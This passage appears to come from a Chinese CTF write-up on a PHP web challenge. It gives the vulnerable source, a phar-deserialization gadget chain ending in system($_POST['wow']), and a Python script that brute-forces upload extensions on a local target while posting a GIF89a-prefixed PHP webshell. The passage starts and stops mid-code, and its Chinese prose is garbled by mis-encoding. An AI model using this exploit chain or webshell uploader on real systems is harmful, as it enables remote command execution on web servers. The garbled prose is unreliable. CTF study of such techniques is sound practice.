</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">future</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$impossible</span><span class="o">=</span><span class="s2">&#34;How can you get here?&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$no</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$useful1</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful2</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful3</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful4</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful5</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful6</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful7</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful8</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful9</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful10</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful11</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful12</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful13</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful14</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful15</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful16</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful17</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful18</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful19</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">,</span> <span class="nv">$arg2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">out</span><span class="o">-&gt;</span><span class="na">useful7</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;Seven is my lucky number&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;This is your future.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;wow&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;win&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">no</span> <span class="o">=</span> <span class="s2">&#34;no&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">no</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Focus on the previous step!&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">],</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nx">best64</span><span class="p">(</span><span class="nv">$data</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// You learn yesterday, you choose today, can you get to your future?
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šé¢çš„æ–¹æ³•æ‰“ä¸äº†ï¼Œçœ‹åˆ°file_existsç»“åˆæ–‡ä»¶ä¸Šä¼ é‚£å°±æ˜¯æ‰“pharååºåˆ—åŒ–äº†</p>
<p><a class="link" href="https://xz.aliyun.com/news/2395?time__1311=eqfxyQKQTxlx0nbD8zmoY5%3D0KpH3D&amp;u_atoken=7e769ef9c37b2448811127724dbbd479&amp;u_asig=1a0c384917405499965972683e0040"  target="_blank" rel="noopener"
    >åˆæ¢phar://-å…ˆçŸ¥ç¤¾åŒº</a></p>
<p><a class="link" href="https://xz.aliyun.com/news/6303"  target="_blank" rel="noopener"
    >phpååºåˆ—åŒ–æ‹“å±•æ”»å‡»è¯¦è§£&ndash;phar-å…ˆçŸ¥ç¤¾åŒº</a></p>
<p>åˆšå¥½æ˜¥ç§‹æ¯æˆ‘ä¹Ÿåšäº†ï¼Œæ‰“è¿™ä¸ªéœ€è¦é…ç¯å¢ƒï¼Œè¿™é‡Œä¸å¤šè®²ï¼Œç›´æ¥åˆ†äº«æ–‡ç« </p>
<p><a class="link" href="https://blog.csdn.net/2301_80915592/article/details/145814351?spm=1011.2415.3001.5331"  target="_blank" rel="noopener"
    >2025æ˜¥ç§‹æ¯å†¬å­£èµ›-web-misc-CSDNåšå®¢</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">   <span class="k">class</span> <span class="nc">yesterday</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$learn</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$study</span><span class="o">=</span><span class="s2">&#34;study&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$try</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">learn</span> <span class="o">=</span> <span class="s2">&#34;learn&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;You studied hard yesterday.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">study</span><span class="o">-&gt;</span><span class="na">hard</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">     <span class="k">class</span> <span class="nc">today</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$doing</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$did</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$done</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">did</span> <span class="o">=</span> <span class="s2">&#34;What you did makes you outstanding.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">,</span> <span class="nv">$arg2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">done</span> <span class="o">=</span> <span class="s2">&#34;And what you&#39;ve done has given you a choice.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">done</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">doing</span><span class="p">))</span><span class="o">==</span><span class="mi">666</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">doing</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">doing</span><span class="o">-&gt;</span><span class="na">better</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">future</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$impossible</span><span class="o">=</span><span class="s2">&#34;How can you get here?&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$no</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$useful1</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful2</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful3</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful4</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful5</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful6</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful7</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful8</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful9</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful10</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful11</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful12</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful13</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful14</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful15</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful16</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful17</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful18</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful19</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">,</span> <span class="nv">$arg2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">out</span><span class="o">-&gt;</span><span class="na">useful7</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;Seven is my lucky number&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;This is your future.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;wow&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;win&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">no</span> <span class="o">=</span> <span class="s2">&#34;no&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">no</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">yesterday</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">study</span><span class="o">=</span><span class="k">new</span> <span class="nx">today</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">study</span><span class="o">-&gt;</span><span class="na">doing</span><span class="o">=</span><span class="k">new</span> <span class="nx">future</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;3xp.phar&#34;</span><span class="p">);</span> <span class="c1">// åˆ›å»ºä¸€ä¸ªåä¸º 3xp.phar çš„ Phar æ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>       <span class="c1">// å¼€å§‹ç¼“å†²ï¼Œä»¥å…è®¸ä¿®æ”¹ Phar æ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;</span><span class="p">);</span> <span class="c1">// è®¾ç½® Phar æ–‡ä»¶çš„å­˜æ ¹ï¼ˆStubï¼‰ï¼Œé˜²æ­¢è¢«è¯¯è®¤ä¸ºæ™®é€š PHP è„šæœ¬
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>   <span class="c1">// å°† Chunqiu å¯¹è±¡ä½œä¸ºå…ƒæ•°æ®å­˜å‚¨åœ¨ Phar æ–‡ä»¶ä¸­
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;exp.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">// å‘ Phar æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªåä¸º exp.txt çš„æ–‡ä»¶ï¼Œå†…å®¹ä¸º &#34;test&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>        <span class="c1">// åœæ­¢ç¼“å†²ï¼Œå¹¶ç”Ÿæˆæœ€ç»ˆçš„ Phar æ–‡ä»¶
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯æ–‡ä»¶ä¸Šä¼ è®¾ç½®äº†åç¼€ï¼Œæç¤ºæ˜¯3ä¸ªå°å†™å­—æ¯,gptå†™ä¸€ä¸ªçˆ†ç ´åç¼€çš„ä»£ç ï¼ˆä¸€å¼€å§‹ä¹Ÿçˆ†ä¸å‡ºï¼Œå°†bpæŠ“åŒ…çš„æ•°æ®ç»™ä»–ç„¶åå†çˆ†å°±è¡Œï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">import</span> <span class="nx">requests</span>
</span></span><span class="line"><span class="cl"><span class="nx">import</span> <span class="nx">itertools</span>
</span></span><span class="line"><span class="cl"><span class="nx">from</span> <span class="nx">concurrent</span><span class="o">.</span><span class="nx">futures</span> <span class="nx">import</span> <span class="nx">ThreadPoolExecutor</span><span class="p">,</span> <span class="nx">as_completed</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">test_extension</span><span class="p">(</span><span class="nx">ext</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nx">url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1:60958/upload.php&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;User-Agent&#34;</span><span class="o">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Referer&#34;</span><span class="o">:</span> <span class="s2">&#34;http://127.0.0.1:60958/&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># ä¿®å¤1: ä¸¥æ ¼éµå¾ªmultipartæ ¼å¼
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">boundary</span> <span class="o">=</span> <span class="s2">&#34;----WebKitFormBoundaryzBu6LJ5xcgw2ScwL&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="nx">f</span><span class="s1">&#39;--{boundary}&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">f</span><span class="s1">&#39;Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;test.{ext}&#34;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Type: application/octet-stream\r\n&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;GIF89a&lt;?php system($_GET[&#34;cmd&#34;]);?&gt;\r\n&#39;</span><span class="p">,</span>  <span class="c1"># å†…å®¹åæ·»åŠ æ¢è¡Œ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">f</span><span class="s1">&#39;--{boundary}--\r\n&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># ä¿®å¤2: æ­£ç¡®ç¼–ç è¯·æ±‚ä½“
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">request_body</span> <span class="o">=</span> <span class="s1">&#39;\r\n&#39;</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="o">.</span><span class="nx">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">response</span> <span class="o">=</span> <span class="nx">requests</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="nx">url</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="o">**</span><span class="nx">headers</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Content-Type&#34;</span><span class="o">:</span> <span class="nx">f</span><span class="s2">&#34;multipart/form-data; boundary={boundary}&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="nx">data</span><span class="o">=</span><span class="nx">request_body</span><span class="p">,</span>  <span class="c1"># ä½¿ç”¨æ­£ç¡®ç¼–ç çš„æ•°æ®
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">timeout</span><span class="o">=</span><span class="mi">5</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># ä¿®å¤3: å¢å¼ºæˆåŠŸæ£€æµ‹é€»è¾‘
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">success</span> <span class="o">=</span> <span class="k">False</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">response</span><span class="o">.</span><span class="nx">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nx">success</span> <span class="o">=</span> <span class="nx">any</span><span class="p">(</span><span class="nx">keyword</span> <span class="nx">in</span> <span class="nx">response</span><span class="o">.</span><span class="nx">text</span><span class="o">.</span><span class="nx">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                          <span class="k">for</span> <span class="nx">keyword</span> <span class="nx">in</span> <span class="p">[</span><span class="s2">&#34;success&#34;</span><span class="p">,</span> <span class="s2">&#34;upload&#34;</span><span class="p">,</span> <span class="s2">&#34;path&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="nx">elif</span> <span class="mi">300</span> <span class="o">&lt;=</span> <span class="nx">response</span><span class="o">.</span><span class="nx">status_code</span> <span class="o">&lt;</span> <span class="mi">400</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nx">success</span> <span class="o">=</span> <span class="k">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nx">success</span><span class="p">,</span> <span class="nx">ext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">except</span> <span class="nx">Exception</span> <span class="k">as</span> <span class="nx">e</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[!] æµ‹è¯• {ext} æ—¶å‘ç”Ÿå¼‚å¸¸: {str(e)}&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="k">False</span><span class="p">,</span> <span class="nx">ext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">brute_extensions</span><span class="p">()</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ä¼˜å…ˆæµ‹è¯•é«˜å±æ‰©å±•å
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">high_risk_exts</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;php&#39;</span><span class="p">,</span> <span class="s1">&#39;phtml&#39;</span><span class="p">,</span> <span class="s1">&#39;phar&#39;</span><span class="p">,</span> <span class="s1">&#39;inc&#39;</span><span class="p">,</span> <span class="s1">&#39;pgp&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># ç”Ÿæˆæ‰€æœ‰ä¸‰ä½ç»„åˆ
